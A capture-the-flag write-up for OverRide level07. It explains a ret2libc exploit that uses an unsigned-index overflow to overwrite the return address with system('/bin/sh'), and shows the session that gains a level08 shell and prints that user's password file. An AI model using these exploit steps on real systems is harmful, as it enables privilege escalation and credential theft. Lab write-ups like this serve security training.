# ret2libc

Stack:
```
esp            0xffffd520       0xffffd520
ebp            0xffffd708       0xffffd708
```

esp - ebp:
```
Hex value:
708 – 520 = 1E8

Decimal value:
1800 – 1312 = 488
```

Padding:
```
488 - (0x24 aka buf)36 = 452
452 padding, +4 to reach return address aka 456 padding. Next 4 bytes are the return address.
```

Addresses:  
`0xf7e6aed0` system  
`0xf7f897ec` /bin/sh

Explaination:
```
456 padding, we're going to write in the int buffer, since it is a buffer of int, we're going to divide our padding by 4 for the index.
456 / 4 = 114
so we'll have the address of system at index 114 and the address of /bin/sh at index 116. (no exit cause whatever)

But we can't use the index 114 because it is divisible by 3, so we'll utilize the fact that this is unsigned int buffer to overflow the value to 114: 1073741938

So let's convert all the values:
index / number:
116 / 4160264172
1073741938 / 4159090384
```
Exploit:
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```